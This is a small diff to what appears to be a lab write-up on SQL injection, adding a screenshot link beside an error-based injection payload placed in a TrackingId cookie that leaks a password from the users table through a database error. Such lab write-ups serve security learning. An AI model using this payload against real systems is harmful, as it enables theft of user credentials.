@@ -72,6 +72,8 @@ Same trick, one column over, leaks the password:
 
 TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
 
+![Error message leaking the administrator password](images/lab13-step3-password-leak.png)
+
 
 ## Result
 
